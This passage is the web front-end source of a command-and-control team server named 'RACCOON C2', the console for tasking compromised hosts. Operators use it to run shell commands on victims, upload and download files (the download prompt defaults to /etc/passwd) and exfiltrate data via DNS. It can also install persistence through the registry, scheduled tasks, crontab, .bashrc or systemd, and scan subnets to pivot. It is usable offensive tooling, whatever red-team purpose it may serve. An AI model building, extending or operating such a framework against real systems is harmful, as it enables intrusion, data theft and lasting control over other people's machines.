.agent-list::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:2px}
</style>
</head>
<body>
<div id="app">
  <header>
    <img src="/logo.png" alt="Logo" onerror="this.style.display='none'">
    <h1>RACCOON C2</h1>
    <span class="subtitle">Team Server</span>
    <div class="spacer"></div>
    <span class="status-dot"></span>
    <span class="info" id="server-info">Listening</span>
    <div class="bell-wrap">
      <button class="bell-btn" onclick="toggleNotifPanel()" title="Notifications">&#128276;<span class="bell-badge" id="bell-badge"></span></button>
      <div class="notif-panel" id="notif-panel">
        <div class="notif-header">
          <span>Notifications</span>
          <button onclick="clearNotifs()">Clear all</button>
        </div>
        <div class="notif-list" id="notif-list">
          <div class="notif-empty">No notifications yet</div>
        </div>
      </div>
    </div>
    <div class="gear-wrap">
      <button class="gear-btn" onclick="toggleSettings()" title="Server Settings">&#9881;</button>
      <div class="settings-panel" id="settings-panel">
        <div class="settings-header">
          <span>&#9881; Server Configuration</span>
          <button onclick="toggleSettings()">&#10005;</button>
        </div>
        <div class="settings-body" id="settings-body">
          <div style="padding:20px;text-align:center;color:var(--text2)">Loading...</div>
        </div>
      </div>
    </div>
  </header>
  <div class="main">
    <div class="sidebar">
      <h2>Agents</h2>
      <div class="agent-list" id="agent-list"></div>
    </div>
    <div class="content" id="content">
      <div class="empty"></div>
    </div>
  </div>
</div>
<div class="toast-container" id="toast-container"></div>

<script>
const TOKEN = "{{TOKEN}}";
const H = {"Authorization":"Bearer "+TOKEN,"Content-Type":"application/json"};
let selectedAgent = null;
let pollTimer = null;
let cmdHistory = [];
let cmdIdx = -1;
let knownAgents = {};
let lastHistLen = {};
let notifLog = [];
let unreadCount = 0;

function toast(type, title, msg, duration){
  const c = document.getElementById("toast-container");
  if(c){
    const el = document.createElement("div");
    el.className = "toast t-"+type;
    const icons = {success:"&#9989;",warning:"&#9888;",error:"&#10060;",info:"&#128276;"};
    el.innerHTML = '<span class="t-icon">'+(icons[type]||icons.info)+'</span>'
      +'<div class="t-body"><div class="t-title">'+title+'</div>'
      +'<div class="t-msg">'+msg+'</div></div>';
    c.appendChild(el);
    setTimeout(() => { el.classList.add("fade-out"); setTimeout(() => el.remove(), 300); }, duration||5000);
  }
  notifLog.unshift({type, title, msg, time:new Date()});
  if(notifLog.length>50) notifLog.length=50;
  unreadCount++;
  updateBellBadge();
  renderNotifList();
}

function updateBellBadge(){
  const b = document.getElementById("bell-badge");
  if(!b) return;
  b.textContent = unreadCount>0 ? (unreadCount>99?"99+":unreadCount) : "";
  b.setAttribute("data-count", unreadCount);
}

function toggleNotifPanel(){
  const p = document.getElementById("notif-panel");
  if(!p) return;
  const opening = !p.classList.contains("open");
  p.classList.toggle("open");
  if(opening){ unreadCount=0; updateBellBadge(); renderNotifList(); }
}

function clearNotifs(){
  notifLog = [];
  unreadCount = 0;
  updateBellBadge();
  renderNotifList();
}

function renderNotifList(){
  const list = document.getElementById("notif-list");
  if(!list) return;
  if(!notifLog.length){ list.innerHTML='<div class="notif-empty">No notifications yet</div>'; return; }
  list.innerHTML = "";
  const icons = {success:"&#9989;",warning:"&#9888;",error:"&#10060;",info:"&#128276;"};
  notifLog.forEach((n,i) => {
    const el = document.createElement("div");
    el.className = "notif-item t-"+n.type+(i<unreadCount?" unread":"");
    const ago = timeSince(n.time.toISOString());
    el.innerHTML = '<span class="ni-icon">'+(icons[n.type]||icons.info)+'</span>'
      +'<div class="ni-body"><div class="ni-title">'+n.title+'</div>'
      +'<div class="ni-msg">'+n.msg+'</div></div>'
      +'<span class="ni-time">'+ago+'</span>';
    list.appendChild(el);
  });
}

document.addEventListener("click", e => {
  const panel = document.getElementById("notif-panel");
  const wrap = e.target.closest(".bell-wrap");
  if(panel && panel.classList.contains("open") && !wrap) panel.classList.remove("open");
});

async function api(path, opts){
  const r = await fetch(path, {headers:H, ...opts});
  return r.json();
}

async function refreshAgents(){
  const agents = await api("/api/agents");
  const list = document.getElementById("agent-list");
  list.innerHTML = "";
  agents.sort((a,b) => {
    const order = {online:0,stale:1,offline:2};
    return (order[a.status]||9) - (order[b.status]||9);
  });

  const currentIds = {};
  agents.forEach(a => {
    currentIds[a.agent_id] = a;
    const prev = knownAgents[a.agent_id];
    if(!prev){
      toast("success", "Agent Connected", esc(a.agent_id)+"<br>"+esc((a.user||"?")+"@"+(a.hostname||"?"))+" &middot; "+esc(a.os||"?"), 8000);
    } else if(prev.status!=="offline" && a.status==="offline"){
      toast("warning", "Agent Offline", esc(a.agent_id)+" went offline", 6000);
    } else if(prev.status==="offline" && a.status==="online"){
      toast("success", "Agent Back Online", esc(a.agent_id)+" reconnected", 5000);
    }
    knownAgents[a.agent_id] = {status:a.status};
  });

  agents.forEach(a => {
    const card = document.createElement("div");
    card.className = "agent-card" + (selectedAgent===a.agent_id?" active":"");
    card.onclick = () => selectAgent(a.agent_id);
    card.innerHTML = `
      <div class="name"><span class="dot ${a.status}"></span>${esc(a.agent_id)}</div>
      <div class="meta">${esc(a.user||'?')}@${esc(a.hostname||'?')} &middot; ${esc(a.os||'?')}</div>
      <div class="meta">${esc(a.arch||'')} &middot; last: ${timeSince(a.last_seen)}</div>
    `;
    list.appendChild(card);
  });
  document.getElementById("server-info").textContent = agents.length+" agent"+(agents.length!==1?"s":"");
}

async function checkTaskResults(){
  if(!selectedAgent) return;
  const hist = await api("/api/agents/"+selectedAgent+"/history");
  const prevLen = lastHistLen[selectedAgent]||0;
  if(hist.length>prevLen){
    for(let i=prevLen;i<hist.length;i++){
      const h = hist[i];
      if(h.status==="error"||h.status==="fail"){
        toast("error", "Task Failed", esc(h.cmd+(h.args?" "+h.args:""))+"<br>"+esc((h.output||"").substring(0,80)), 6000);
      }
    }
  }
  lastHistLen[selectedAgent] = hist.length;
}

function selectAgent(id){
  if(selectedAgent === id){
    selectedAgent = null;
    if(pollTimer){ clearInterval(pollTimer); pollTimer=null; }
    document.getElementById("content").innerHTML = '<div class="empty"></div>';
    refreshAgents();
    return;
  }
  selectedAgent = id;
  if(pollTimer) clearInterval(pollTimer);
  renderAgentView(id);
  pollTimer = setInterval(() => pollHistory(id), 2000);
  refreshAgents();
}

async function renderAgentView(id){
  const info = await api("/api/agents/"+id);
  const hist = await api("/api/agents/"+id+"/history");
  const content = document.getElementById("content");
  content.innerHTML = `
    <div class="agent-header">
      <span class="agent-name">${esc(id)}</span>
      <span class="tag">${esc(info.arch||'?')}</span>
      <span class="tag">${esc(info.os||'?')}</span>
      <span class="detail">${esc(info.user||'?')}@${esc(info.hostname||'?')} · PID ${info.pid||'?'} · up ${formatUptime(info.uptime||0)}</span>
    </div>
    <div class="terminal-wrap">
      <div class="toolbar">
        <button onclick="openFileBrowser()"><span class="ico">&#128194;</span> Files</button>
        <button onclick="triggerUpload()"><span class="ico">&#11014;</span> Upload</button>
        <button onclick="promptDownload()"><span class="ico">&#11015;</span> Download</button>
        <button onclick="quickCmd('shell','whoami','whoami')"><span class="ico">&#128100;</span> whoami</button>
        <button onclick="quickCmd('shell','id','id')"><span class="ico">&#128273;</span> id</button>
        <button onclick="quickCmd('shell','uname -a','sysinfo')"><span class="ico">&#128187;</span> sysinfo</button>
        <button onclick="showProcs()"><span class="ico">&#9881;</span> procs</button>
        <button onclick="quickCmd('shell','netstat -tlnp 2>/dev/null || netstat -an','Network')"><span class="ico">&#127760;</span> netstat</button>
        <button onclick="showBeaconConfig()"><span class="ico">&#9881;</span> Beacon</button>
        <button onclick="showPivotMap()"><span class="ico">&#127760;</span> Pivot Map</button>
        <button onclick="showHelp()"><span class="ico">&#10067;</span> Help</button>
      </div>
      <div class="terminal-split">
        <div class="terminal-left">
          <div class="terminal" id="terminal"></div>
        </div>
        <div class="resizer" id="resizer"></div>
        <div class="side-panel" id="side-panel">
          <div class="side-panel-header">
            <span class="title" id="panel-title">Panel</span>
            <button onclick="closePanel()">✕</button>
          </div>
          <div class="side-panel-body" id="panel-body"></div>
        </div>
      </div>
      <div class="input-bar">
        <span class="prompt">${esc(id)} &#10095;</span>
        <div style="flex:1;position:relative">
          <span class="ghost" id="ac-ghost"></span>
          <input id="cmd-input" placeholder="Type a command... (Tab to complete)" autocomplete="off" style="width:100%;position:relative;z-index:1;background:rgba(0,0,0,0.5)">
          <div class="ac-dropdown" id="ac-dropdown"></div>
        </div>
        <button onclick="sendCmd()">Send</button>
      </div>
    </div>
  `;
  const term = document.getElementById("terminal");
  term.innerHTML = '<div class="t-system">Session opened with '+esc(id)+'</div>';
  hist.forEach(h => renderHistoryEntry(h));
  term.scrollTop = term.scrollHeight;

  const input = document.getElementById("cmd-input");
  input.addEventListener("keydown", handleInputKey);
  input.addEventListener("input", updateAutocomplete);
  input.focus();
}

function colorizeOutput(text){
  let s = esc(text);
  s = s.replace(/^(total\s+\d+)$/gm, '<span style="color:var(--text2)">$1</span>');
  s = s.replace(/^(d[rwxsStT-]{9})/gm, '<span style="color:var(--red)">$1</span>');
  s = s.replace(/^(-[rwxsStT-]{9})/gm, '<span style="color:var(--green)">$1</span>');
  s = s.replace(/^((?:\/[\w._-]+)+\/?)/gm, '<span style="color:var(--yellow)">$1</span>');
  s = s.replace(/((?:\d{1,3}\.){3}\d{1,3}(?::\d+)?)/g, '<span style="color:var(--yellow)">$1</span>');
  s = s.replace(/\b(root|SYSTEM|Administrator)\b/g, '<span style="color:var(--red);font-weight:700">$1</span>');
  s = s.replace(/\b(LISTEN|ESTABLISHED|CONNECTED)\b/g, '<span style="color:var(--green)">$1</span>');
  s = s.replace(/\b(CLOSE_WAIT|TIME_WAIT|FIN_WAIT\w*)\b/g, '<span style="color:var(--orange)">$1</span>');
  s = s.replace(/\b(ERROR|FAILED|denied|refused|Permission denied)\b/gi, '<span style="color:#ff6666;font-weight:700">$1</span>');
  return s;
}

function renderHistoryEntry(h){
  const term = document.getElementById("terminal");
  if(!term) return;
  const full = h.cmd + (h.args ? " " + h.args : "");
  let html = '<div class="t-cmd"><span style="color:var(--yellow)">'+esc(h.cmd)+'</span>';
  if(h.args) html += ' <span style="color:var(--text)">'+esc(h.args)+'</span>';
  html += '</div>';
  if(h.status==="pending"||h.status===null){
    html += '<div class="t-pending">&#9203; waiting for agent...</div>';
  } else if(h.status==="ok"){
    html += '<div class="t-output">'+colorizeOutput(h.output||"(no output)")+'</div>';
  } else {
    html += '<div class="t-error">'+colorizeOutput(h.output||"(error)")+'</div>';
  }
  term.innerHTML += html;
}

async function sendCmd(){
  const input = document.getElementById("cmd-input");
  const raw = input.value.trim();
  if(!raw || !selectedAgent) return;
  input.value = "";
  cmdHistory.push(raw);
  cmdIdx = -1;

  const parts = raw.split(/\s+/);
  const cmd = parts[0];
  let args = parts.slice(1).join(" ");
  let data = "";

  if(cmd==="upload" && parts.length>=2){
    const fileInput = document.createElement("input");
    fileInput.type = "file";
    fileInput.onchange = async () => {
      const file = fileInput.files[0];
      if(!file) return;
      const buf = await file.arrayBuffer();
      const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
      await api("/api/agents/"+selectedAgent+"/task",{method:"POST",body:JSON.stringify({cmd,args,data:b64})});
      pollHistory(selectedAgent);
    };
    fileInput.click();
    return;
  }

  await api("/api/agents/"+selectedAgent+"/task",{
    method:"POST",
    body:JSON.stringify({cmd,args,data})
  });
  pollHistory(selectedAgent);
}

async function pollHistory(id){
  if(id !== selectedAgent) return;
  const hist = await api("/api/agents/"+id+"/history");
  const term = document.getElementById("terminal");
  if(!term) return;
  term.innerHTML = '<div class="t-system">Session opened with '+esc(id)+'</div>';
  hist.forEach(h => renderHistoryEntry(h));
  term.scrollTop = term.scrollHeight;
  refreshAgents();
}

function esc(s){
  if(s==null) return "";
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}

function timeSince(iso){
  if(!iso) return "never";
  const d = (Date.now()-new Date(iso).getTime())/1000;
  if(d<60) return Math.floor(d)+"s ago";
  if(d<3600) return Math.floor(d/60)+"m ago";
  if(d<86400) return Math.floor(d/3600)+"h ago";
  return Math.floor(d/86400)+"d ago";
}

function formatUptime(s){
  if(s<60) return s+"s";
  if(s<3600) return Math.floor(s/60)+"m";
  if(s<86400) return Math.floor(s/3600)+"h "+Math.floor((s%3600)/60)+"m";
  return Math.floor(s/86400)+"d "+Math.floor((s%86400)/3600)+"h";
}

// ── Side panel ──
let panelPollTimer = null;

function openPanel(title, content){
  const panel = document.getElementById("side-panel");
  const body = document.getElementById("panel-body");
  const titleEl = document.getElementById("panel-title");
  titleEl.textContent = title;
  body.innerHTML = content;
  panel.classList.add("open");
}

function closePanel(){
  document.getElementById("side-panel").classList.remove("open");
  fbVisible = false;
  if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }
  stopPivotAnim();
}

// ── Resizer ──
(function(){
  let startX, startW, resizer, panel;
  document.addEventListener("mousedown", e => {
    if(!e.target.closest("#resizer")) return;
    resizer = document.getElementById("resizer");
    panel = document.getElementById("side-panel");
    if(!panel.classList.contains("open")) return;
    startX = e.clientX;
    startW = panel.offsetWidth;
    resizer.classList.add("active");
    document.body.style.cursor = "col-resize";
    document.body.style.userSelect = "none";
    const onMove = ev => { panel.style.width = Math.max(200, startW - (ev.clientX - startX))+"px"; };
    const onUp = () => {
      resizer.classList.remove("active");
      document.body.style.cursor = "";
      document.body.style.userSelect = "";
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
    document.addEventListener("mousemove", onMove);
    document.addEventListener("mouseup", onUp);
  });
})();

// ── Quick commands ──
async function quickCmd(cmd, args, toPanel){
  if(!selectedAgent) return;
  await api("/api/agents/"+selectedAgent+"/task",{
    method:"POST", body:JSON.stringify({cmd, args, data:""})
  });
  if(toPanel){
    openPanel(toPanel, '<div class="t-pending">Waiting for agent...</div>');
    if(panelPollTimer) clearInterval(panelPollTimer);
    panelPollTimer = setInterval(() => pollPanelResult(cmd, args, toPanel), 1500);
  }
  pollHistory(selectedAgent);
}

async function pollPanelResult(cmd, args, title){
  if(!selectedAgent) return;
  const hist = await api("/api/agents/"+selectedAgent+"/history");
  const matches = hist.filter(h => h.cmd===cmd && h.args===args);
  const last = matches[matches.length-1];
  if(!last || last.status==="pending" || last.status===null) return;
  if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }
  const body = document.getElementById("panel-body");
  if(!body) return;
  if(last.status==="ok"){
    body.innerHTML = '<div class="t-output">'+esc(last.output||"(no output)")+'</div>';
  } else {
    body.innerHTML = '<div class="t-error">'+esc(last.output||"(error)")+'</div>';
  }
}

// ── Process listing with beacon highlight ──
async function showProcs(){
  if(!selectedAgent) return;
  const procsCmd = 'ps aux 2>/dev/null || tasklist';
  await api("/api/agents/"+selectedAgent+"/task",{
    method:"POST", body:JSON.stringify({cmd:"shell", args:procsCmd, data:""})
  });
  openPanel("Processes", '<div class="t-pending">Waiting for agent...</div>');
  if(panelPollTimer) clearInterval(panelPollTimer);
  panelPollTimer = setInterval(() => pollProcsResult(procsCmd), 1500);
  pollHistory(selectedAgent);
}

async function pollProcsResult(procsCmd){
  if(!selectedAgent) return;
  const hist = await api("/api/agents/"+selectedAgent+"/history");
  const matches = hist.filter(h => h.cmd==="shell" && h.args===procsCmd);
  const last = matches[matches.length-1];
  if(!last || last.status==="pending" || last.status===null) return;
  if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }
  const body = document.getElementById("panel-body");
  if(!body) return;
  if(last.status!=="ok"){ body.innerHTML='<div class="t-error">'+esc(last.output||"(error)")+'</div>'; return; }
  const info = await api("/api/agents/"+selectedAgent);
  const pid = info && info.pid ? String(info.pid) : null;
  const lines = (last.output||"").split("\n");
  let html = '<div class="t-output">';
  for(const line of lines){
    if(pid && line.match(new RegExp("(^|\\s)"+pid+"(\\s|$)"))){
      html += '<span style="color:#FFD700;font-weight:bold">'+esc(line)+' [BEACON]</span>\n';
    } else {
      html += esc(line)+'\n';
    }
  }
  html += '</div>';
  body.innerHTML = html;
}

// ── File browser ──
let fbPath = "/";
let fbVisible = false;

function openFileBrowser(path){
  if(!selectedAgent) return;
  if(!path && fbVisible){ closePanel(); return; }
  fbPath = path || "/";
  fbVisible = true;
  quickCmd("ls", fbPath);
  openPanel("Files: "+fbPath, `
    <div class="filebrowser">
      <div class="fb-path">
        <button onclick="openFileBrowser(parentDir(fbPath))">&#11014; Up</button>
        <span>&#128194; ${esc(fbPath)}</span>
        <button onclick="openFileBrowser(fbPath)" style="margin-left:auto">&#8635;</button>
      </div>
      <div class="fb-upload-zone" id="fb-drop" onclick="fbUploadClick()"
           ondragover="event.preventDefault();this.classList.add('drag-over')"
           ondragleave="this.classList.remove('drag-over')"
           ondrop="event.preventDefault();this.classList.remove('drag-over');fbDropUpload(event.dataTransfer.files)">
        &#11014; Drop files here or click to upload to <b>${esc(fbPath)}</b>
      </div>
      <div class="fb-list" id="fb-list"><div class="t-pending">Loading...</div></div>
    </div>`);
  setTimeout(() => renderFBFromHistory(), 3000);
}

function parentDir(p){
  const parts = p.replace(/\/$/,"").split("/");
  parts.pop();
  return parts.join("/") || "/";
}

function fbUploadClick(){
  const fi = document.createElement("input");
  fi.type = "file";
  fi.multiple = true;
  fi.onchange = () => fbDropUpload(fi.files);
  fi.click();
}

async function fbDropUpload(files){
  if(!selectedAgent || !files.length) return;
  for(const file of files){
    const buf = await file.arrayBuffer();
    const bytes = new Uint8Array(buf);
    let b64 = "";
    const chunk = 8192;
    for(let i=0;i<bytes.length;i+=chunk){
      b64 += String.fromCharCode.apply(null, bytes.subarray(i, i+chunk));
    }
    b64 = btoa(b64);
    const dest = fbPath.endsWith("/") ? fbPath+file.name : fbPath+"/"+file.name;
    await api("/api/agents/"+selectedAgent+"/task",{
      method:"POST", body:JSON.stringify({cmd:"upload", args:dest, data:b64})
    });
  }
  const zone = document.getElementById("fb-drop");
  if(zone) zone.innerHTML = "&#10003; "+files.length+" file"+(files.length>1?"s":"")+" queued for upload";
  pollHistory(selectedAgent);
  setTimeout(() => openFileBrowser(fbPath), 4000);
}

function fbDownloadFile(path){
  if(!selectedAgent) return;
  quickCmd("download", path, "Download: "+path.split("/").pop());
}

async function renderFBFromHistory(){
  if(!fbVisible || !selectedAgent) return;
  const hist = await api("/api/agents/"+selectedAgent+"/history");
  const lsEntries = hist.filter(h => h.cmd==="ls" && h.args===fbPath && h.status==="ok");
  if(!lsEntries.length){
    setTimeout(renderFBFromHistory, 1000);
    return;
  }
  const output = lsEntries[lsEntries.length-1].output || "";
  const list = document.getElementById("fb-list");
  if(!list) return;
  list.innerHTML = "";
  const lines = output.split("\n").filter(l => l.trim());
  lines.forEach(line => {
    const entry = document.createElement("div");
    const parts = line.trim().split(/\s+/);
    const perm = parts[0] || "";
    const size = parts.length > 1 ? parts[parts.length-2] : "";
    const name = parts.length > 1 ? parts[parts.length-1] : line.trim();
    const isDir = perm.startsWith("d") || name.endsWith("/");
    entry.className = "fb-entry " + (isDir ? "dir" : "file");
    const fullPath = fbPath.endsWith("/") ? fbPath+name : fbPath+"/"+name;
    if(isDir){
      entry.onclick = e => { if(!e.target.closest(".actions")) openFileBrowser(fullPath); };
      entry.innerHTML = '<span class="ico">&#128193;</span><span class="name">'+esc(name)+'</span><span class="size">'+esc(size)+'</span><span class="perm">'+esc(perm)+'</span>';
    } else {
      entry.onclick = e => { if(!e.target.closest(".actions")){ document.getElementById("cmd-input").value = "cat "+fullPath; document.getElementById("cmd-input").focus(); }};
      entry.innerHTML = '<span class="ico">&#128196;</span><span class="name">'+esc(name)+'</span><span class="size">'+esc(size)+'</span>'
        +'<span class="actions">'
        +'<button onclick="fbDownloadFile(\''+esc(fullPath.replace(/'/g,"\\'"))+'\')">&#11015; DL</button>'
        +'<button onclick="event.stopPropagation();document.getElementById(\'cmd-input\').value=\'cat '+esc(fullPath)+'\';document.getElementById(\'cmd-input\').focus()">&#128065; View</button>'
        +'</span>'
        +'<span class="perm">'+esc(perm)+'</span>';
    }
    list.appendChild(entry);
  });
  if(!lines.length) list.innerHTML = '<div class="t-system">Empty directory</div>';
}

// ── Upload ──
function triggerUpload(){
  if(!selectedAgent) return;
  const remotePath = prompt("Remote path to write file to:", "/tmp/");
  if(!remotePath) return;
  const fileInput = document.createElement("input");
  fileInput.type = "file";
  fileInput.onchange = async () => {
    const file = fileInput.files[0];
    if(!file) return;
    const buf = await file.arrayBuffer();
    const bytes = new Uint8Array(buf);
    let b64 = "";
    const chunk = 8192;
    for(let i=0;i<bytes.length;i+=chunk){
      b64 += String.fromCharCode.apply(null, bytes.subarray(i, i+chunk));
    }
    b64 = btoa(b64);
    const dest = remotePath.endsWith("/") ? remotePath+file.name : remotePath;
    await api("/api/agents/"+selectedAgent+"/task",{
      method:"POST", body:JSON.stringify({cmd:"upload", args:dest, data:b64})
    });
    pollHistory(selectedAgent);
  };
  fileInput.click();
}

// ── Download ──
function promptDownload(){
  if(!selectedAgent) return;
  const path = prompt("Remote file path to download:", "/etc/passwd");
  if(!path) return;
  quickCmd("download", path);
}

// ── Help ──
function showHelp(){
  openPanel("Help", `
    <div class="t-info">━━━ Available commands ━━━</div>
    <div class="t-output">  shell &lt;cmd&gt;       Execute shell command</div>
    <div class="t-output">  ls &lt;path&gt;         List directory</div>
    <div class="t-output">  cat &lt;path&gt;        Read file contents</div>
    <div class="t-output">  pwd               Print working directory</div>
    <div class="t-output">  cd &lt;path&gt;         Change directory</div>
    <div class="t-output">  cp &lt;src&gt; &lt;dst&gt;    Copy file</div>
    <div class="t-output">  mv &lt;src&gt; &lt;dst&gt;    Move/rename file</div>
    <div class="t-output">  rm &lt;path&gt;         Remove file/directory</div>
    <div class="t-output">  mkdir &lt;path&gt;      Create directory</div>
    <div class="t-output">  chmod &lt;mode&gt; &lt;f&gt;  Change permissions</div>
    <div class="t-output">  write &lt;path&gt;      Write text to file (via data)</div>
    <div class="t-output">  upload &lt;path&gt;     Upload file to agent</div>
    <div class="t-output">  download &lt;path&gt;   Download file from agent</div>
    <div class="t-output">  exfil &lt;path&gt;      Exfiltrate file via DNS</div>
    <div class="t-output">  sleep &lt;s&gt; &lt;j%&gt;    Set beacon interval + jitter</div>
    <div class="t-output">  persist &lt;method&gt;  Install persistence (auto/registry/startup/schtask/crontab/bashrc/systemd)</div>
    <div class="t-output">  unpersist &lt;method&gt; Remove persistence</div>
    <div class="t-output">  netscan [subnet]  Scan /24 subnet for hosts</div>
    <div class="t-output">  arptable          Show ARP neighbor table</div>
    <div class="t-output">  kill              Terminate beacon</div>
    <div class="t-info">━━━━━━━━━━━━━━━━━━━━━━━━</div>
  `);
}

// ── Beacon config panel ──
async function showBeaconConfig(){
  if(!selectedAgent) return;
  const info = await api("/api/agents/"+selectedAgent);
  const curInterval = info.interval || 5;
  openPanel("Beacon Config", `
    <div style="padding:4px 0">
      <div class="t-info" style="margin-bottom:12px">&#9881; Sleep / Jitter</div>
      <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px">
        <label style="color:var(--text2);font-size:12px;width:70px">Interval</label>
        <input id="cfg-interval" type="number" min="1" max="86400" value="${curInterval}"
          style="width:80px;background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:4px;padding:6px 10px;color:var(--text);font-family:var(--mono);font-size:13px">
        <span style="color:var(--text2);font-size:12px">seconds</span>
      </div>
      <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px">
        <label style="color:var(--text2);font-size:12px;width:70px">Jitter</label>
        <input id="cfg-jitter" type="range" min="0" max="90" value="10" style="flex:1"
          oninput="document.getElementById('cfg-jitter-val').textContent=this.value+'%'">
        <span id="cfg-jitter-val" style="color:var(--text);font-size:12px;width:36px">10%</span>
      </div>
      <button onclick="applySleepConfig()" style="margin-top:4px;padding:8px 20px;background:var(--red-dim);color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">Apply Sleep</button>
      <div style="margin-top:24px">
        <div class="t-info" style="margin-bottom:12px">&#128274; Persistence</div>
        <div style="color:var(--text2);font-size:11px;margin-bottom:10px">Install autostart persistence on the target. Method is auto-detected based on OS if set to auto.</div>
        <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px">
          <label style="color:var(--text2);font-size:12px;width:70px">Method</label>
          <select id="cfg-persist-method" style="flex:1;background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:4px;padding:6px 10px;color:var(--text);font-family:var(--mono);font-size:12px">
            <option value="auto">auto (detect OS)</option>
            <option value="registry">registry (HKCU Run)</option>
            <option value="startup">startup folder (VBS)</option>
            <option value="schtask">scheduled task</option>
            <option value="crontab">crontab @reboot</option>
            <option value="bashrc">.bashrc</option>
            <option value="systemd">systemd user service</option>
          </select>
        </div>
        <div style="display:flex;gap:8px;margin-top:8px">
          <button onclick="applyPersist()" style="padding:8px 20px;background:var(--green-dim);color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">Install</button>
          <button onclick="removePersist()" style="padding:8px 20px;background:rgba(255,255,255,0.06);color:var(--text);border:1px solid var(--border);border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">Remove</button>
        </div>
      </div>
      <div style="margin-top:24px">
        <div class="t-info" style="margin-bottom:8px">&#128163; Kill Agent</div>
        <div style="color:var(--text2);font-size:11px;margin-bottom:10px">Terminate the beacon process on the target.</div>
        <button onclick="if(confirm('Kill agent '+selectedAgent+'?'))quickCmd('kill','')" style="padding:8px 20px;background:#661111;color:#ff6666;border:1px solid #882222;border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">Kill Beacon</button>
      </div>
    </div>
  `);
}

function applySleepConfig(){
  const interval = document.getElementById("cfg-interval").value;
  const jitter = document.getElementById("cfg-jitter").value;
  quickCmd("sleep", interval+" "+jitter);
  toast("info","Beacon Config","Sleep set to "+interval+"s / jitter "+jitter+"%",3000);
}

function applyPersist(){
  const method = document.getElementById("cfg-persist-method").value;
  quickCmd("persist", method, "Persistence");
  toast("info","Persistence","Installing via "+method+"...",3000);
}

function removePersist(){
  const method = document.getElementById("cfg-persist-method").value;
  quickCmd("unpersist", method, "Unpersist");
  toast("warning","Persistence","Removing via "+method+"...",3000);
}

// ── Pivot map ──
let pivotScanData = {};
let pivotNodes = [];
let pivotDrag = null;
let pivotPan = {x:0, y:0};
let pivotPanStart = null;
let pivotZoom = 1;
let pivotAnimId = null;
let pivotTime = 0;
let pivotDidDrag = false;

if(!CanvasRenderingContext2D.prototype.roundRect){
  CanvasRenderingContext2D.prototype.roundRect = function(x,y,w,h,r){
    r = Math.min(r||0, w/2, h/2);
    this.moveTo(x+r, y);
    this.lineTo(x+w-r, y);
    this.arcTo(x+w, y, x+w, y+r, r);
    this.lineTo(x+w, y+h-r);
    this.arcTo(x+w, y+h, x+w-r, y+h, r);
    this.lineTo(x+r, y+h);
    this.arcTo(x, y+h, x, y+h-r, r);
    this.lineTo(x, y+r);
    this.arcTo(x, y, x+r, y, r);
    this.closePath();
  };
}

async function showPivotMap(){
  if(!selectedAgent) return;
  pivotZoom = 1;
  pivotPan = {x:0, y:0};
  const info = await api("/api/agents/"+selectedAgent);
  const allAgents = await api("/api/agents");

  openPanel("Pivot Map", `
    <div class="pivot-controls">
      <button onclick="runNetScan()">&#128269; Scan Subnet</button>
      <button onclick="runArpScan()">&#128203; ARP Table</button>
      <button onclick="refreshPivotMap()">&#8635; Refresh</button>
      <span style="flex:1"></span>
      <button onclick="pivotZoomIn()" title="Zoom in">&#10133;</button>
      <button onclick="pivotFitAll()" title="Fit all">&#9635;</button>
      <button onclick="pivotZoomOut()" title="Zoom out">&#10134;</button>
      <a href="https://benjitrapp.github.io/raccoon-route/" target="_blank" rel="noopener" style="padding:5px 12px;background:rgba(255,255,255,0.04);color:var(--text2);border:1px solid var(--border);border-radius:4px;font-size:11px;text-decoration:none;display:flex;align-items:center;gap:4px;transition:all 0.15s" onmouseover="this.style.borderColor='var(--red-dim)';this.style.color='var(--red)'" onmouseout="this.style.borderColor='';this.style.color=''">&#128214; Raccoon Route</a>
    </div>
    <div class="pivot-legend">
      <span><span class="dot" style="background:var(--red);box-shadow:0 0 6px var(--red)"></span> C2 Server</span>
      <span><span class="dot" style="background:var(--green);box-shadow:0 0 6px var(--green)"></span> Beacon</span>
      <span><span class="dot" style="background:#FFD700;box-shadow:0 0 6px #FFD700"></span> Selected</span>
      <span><span class="dot" style="background:#5588cc"></span> Discovered</span>
      <span><span class="dot" style="background:#555"></span> Offline</span>
      <span style="margin-left:auto;color:var(--text2);font-size:10px" id="pivot-zoom-label">100%</span>
    </div>
    <div style="position:relative;flex:1;min-height:0">
      <canvas class="pivot-canvas" id="pivot-canvas" width="800" height="500"></canvas>
      <div id="pivot-tooltip-wrap" style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:10"></div>
    </div>
  `);

  buildPivotGraph(info, allAgents);
  setTimeout(pivotFitAll, 50);
}

function buildPivotGraph(currentInfo, allAgents){
  pivotNodes = [];
  const cx = 400, cy = 250;

  pivotNodes.push({
    id: "c2-server", type: "c2", x: cx, y: 60,
    label: "C2 Server", sub: window.location.host,
    color: "#ff1a1a", glow: "rgba(255,26,26,0.5)"
  });

  const agentOnline = allAgents.filter(a => a.status !== "offline");
  const agentOffline = allAgents.filter(a => a.status === "offline");
  const totalAgents = allAgents.length;
  const angleStep = totalAgents > 0 ? (Math.PI * 0.8) / Math.max(totalAgents, 1) : 0;
  const startAngle = Math.PI * 0.1;

  allAgents.forEach((a, i) => {
    const angle = startAngle + angleStep * i;
    const radius = 160;
    const x = cx + Math.cos(angle + Math.PI/2) * radius * 1.5;
    const y = 60 + Math.sin(angle + Math.PI/2) * radius + 40;
    const isSelected = a.agent_id === selectedAgent;
    const isOnline = a.status !== "offline";
